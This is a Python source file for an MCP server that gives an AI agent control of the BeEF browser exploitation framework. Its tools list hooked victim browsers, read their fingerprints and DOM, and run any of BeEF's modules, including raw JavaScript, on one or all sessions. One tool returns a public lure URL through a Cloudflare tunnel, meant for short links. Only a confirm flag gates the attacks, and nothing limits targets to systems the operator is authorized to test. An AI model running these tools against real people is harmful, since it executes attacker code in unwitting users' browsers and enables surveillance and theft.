"""MCP server BeEF: drives the operator console through the REST API.

BeEF (Browser Exploitation Framework) exposes a complete REST API but without a
client: the only graphical interface is the web console, which is driven only with
the mouse. This server gives the agent the same capabilities as tools: list the
hooked browsers, search for a module, run it on a session, read the
result, destroy a hook.

Auth: BeEF API token, re-read on each call from BEEF_API_TOKEN_FILE. The
services/beef module makes this token deterministic (patch of core/main/crypto.rb +
sops secret): otherwise BeEF generates a random one on each start and does not
persist it anywhere.

Write policy: running a module means code that runs in the
victim's browser. `beef_run_module` and `beef_unhook` therefore require
`confirm=True`; without it, the tool returns the preview of what would go out, without
sending anything.

Known limitation: BeEF imitates a web server (web_server_imitation: apache), so
a nonexistent route returns an Apache 404 page and not an error JSON.
"""

import json
import os
import urllib.error
import urllib.parse
import urllib.request

from mcp.server.fastmcp import FastMCP

BASE_URL = os.environ.get("BEEF_URL", "http://127.0.0.1:3010").rstrip("/")
TOKEN_FILE = os.environ.get("BEEF_API_TOKEN_FILE", "")
PUBLIC_HOST_FILE = os.environ.get(
    "BEEF_PUBLIC_HOST_FILE", "/var/lib/beef/public-host")
TIMEOUT = float(os.environ.get("BEEF_TIMEOUT", "30"))

mcp = FastMCP("beef")


def _read_file(path, what):
    if not path:
        raise RuntimeError(
            "%s : path not configured in the MCP server config" % what
        )
    try:
        with open(path) as f:
            return f.read().strip()
    except OSError as exc:
        raise RuntimeError("%s unreadable (%s) : %s" % (what, path, exc))


def _token():
    token = _read_file(TOKEN_FILE, "BeEF API token")
    if not token:
        raise RuntimeError("empty BeEF API token in %s" % TOKEN_FILE)
    return token


def _api(method, path, query=None, body=None):
    """Calls the BeEF REST API and returns {status, body} or {status, error}."""
    clean = {k: v for k, v in (query or {}).items() if v is not None}
    clean["token"] = _token()
    url = BASE_URL + "/api" + path + "?" + urllib.parse.urlencode(
        clean, doseq=True)
    data = None
    headers = {"Accept": "application/json"}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers,
                                 method=method)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            raw = r.read().decode("utf-8", "replace")
            return {"status": r.status,
                    "body": json.loads(raw) if raw.strip() else {}}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            payload = json.loads(raw)
        except ValueError:
            payload = raw[:2000]
        return {"status": e.code, "error": payload}
    except urllib.error.URLError as e:
        return {"status": 0, "error": "unreachable: %s" % e.reason}


def _guard(action, payload):
    return {
        "dry_run": True,
        "reason": "action that runs code in the hooked browser: "
                  "re-run with confirm=True",
        "action": action,
        "payload": payload,
    }


def _sessions():
    """Sessions of the online browsers, for the tools that take one."""
    res = _api("GET", "/hooks")
    body = res.get("body") or {}
    online = (body.get("hooked-browsers") or {}).get("online") or {}
    return [b.get("session") for b in online.values() if b.get("session")]


@mcp.tool()
def beef_status() -> dict:
    """State of the BeEF server: API version and hooked sessions online.

    Serves as a smoke test: an invalid token returns 401 here, a stopped BeEF
    returns "unreachable".
    """
    version = _api("GET", "/server/version")
    mounts = _api("GET", "/server/mounts")
    hooks = _api("GET", "/hooks")
    body = hooks.get("body") or {}
    hb = body.get("hooked-browsers") or {}
    return {
        "version": version,
        "mounts": mounts,
        "online": list((hb.get("online") or {}).values()),
        "offline": len(hb.get("offline") or {}),
    }


@mcp.tool()
def beef_hooked_browsers(online_only: bool = False) -> dict:
    """Hooked browsers: session, browser, OS, current page, last seen.

    `session` is the identifier to pass to the other tools. A browser counts
    as online if it has polled within the last 15 seconds (WebSocket
    disabled).
    """
    res = _api("GET", "/hooks")
    body = res.get("body") or {}
    hb = body.get("hooked-browsers") or {}
    if online_only:
        hb = {"online": hb.get("online") or {}}
    return res


@mcp.tool()
def beef_browser_details(session: str) -> dict:
    """Details of a hooked browser: headers, fingerprint, plugins, local DOM.

    `session` comes from beef_hooked_browsers.
    """
    return _api("GET", "/browserdetails/" + session)


@mcp.tool()
def beef_modules(search: str | None = None) -> dict:
    """Catalogue of BeEF modules (300+), or a search by name if `search`.

    Each entry carries `id` (to pass to beef_module_options), `name` and
    `category`.
    """
    if search:
        return _api("GET", "/modules/search/" + search)
    return _api("GET", "/modules")


@mcp.tool()
def beef_module_options(mod_id: int) -> dict:
    """Options of a module: name, description, default value.

    Read before beef_run_module: the expected key in `options` is that of the
    options listed here (e.g. module 80 raw_javascript -> key `cmd`).
    """
    return _api("GET", "/modules/" + str(mod_id))


@mcp.tool()
def beef_run_module(
    mod_id: int,
    options: dict,
    session: str | None = None,
    confirm: bool = False,
) -> dict:
    """Runs a module in the hooked browser (code runs ON THE VICTIM).

    Without `session`, the module goes out to ALL online sessions.
    `options`: dict of the module's options (see beef_module_options).
    Real and immediate side effect on the victim's machine: requires
    `confirm=True`, otherwise the tool only returns the preview of the send.
    Returns `command_id`, to be read back with beef_command_result.
    """
    if not confirm:
        return _guard("modules/" + str(mod_id), {
            "module_id": mod_id,
            "options": options,
            "sessions": [session] if session else _sessions(),
        })
    sessions = [session] if session else _sessions()
    if not sessions:
        return {"status": 0, "error": "no hooked session online"}
    results = {}
    for s in sessions:
        results[s] = _api(
            "POST", "/modules/%s/%s" % (s, mod_id), body=options)
    return {"sessions": len(results), "results": results}


@mcp.tool()
def beef_command_result(session: str, mod_id: int, cmd_id: int) -> dict:
    """Result of a command already sent (empty as long as the browser has
    not replied: the hook polls every second)."""
    return _api("GET", "/modules/%s/%s/%s" % (session, mod_id, cmd_id))


@mcp.tool()
def beef_logs(session: str | None = None, limit: int = 40) -> dict:
    """Latest BeEF events (hook, modules, errors). `limit` truncates the
    list, the most recent last."""
    path = "/logs/" + session if session else "/logs"
    res = _api("GET", path)
    body = res.get("body")
    if isinstance(body, dict) and isinstance(body.get("logs"), list):
        body["logs"] = body["logs"][-limit:]
    return res


@mcp.tool()
def beef_unhook(session: str, confirm: bool = False) -> dict:
    """Removes a browser from the console (the hook stops polling).

    Once removed, you must make it open the lure URL again to
    get it back: requires `confirm=True`.
    """
    if not confirm:
        return _guard("hooks/" + session + "/delete", {"session": session})
    return _api("GET", "/hooks/" + session + "/delete")


@mcp.tool()
def beef_lure_url() -> dict:
    """Public URL of the lure, the one to put in a short link.

    The name comes from the Cloudflare quick tunnel and changes on each restart of
    cloudflared (the beef-tunnel-sync module realigns BeEF on it): never
    consider it stable, re-read it before each broadcast.
    """
    host = _read_file(PUBLIC_HOST_FILE, "public lure host")
    host = host.split("//")[-1].rstrip("/")
    return {
        "host": host,
        "leurre": "https://%s/demos/basic.html" % host,
        "hook": "https://%s/hook.js" % host,
        "console": "https://beef.marcpartensky.com/ui/panel/",
    }


if __name__ == "__main__":
    mcp.run()
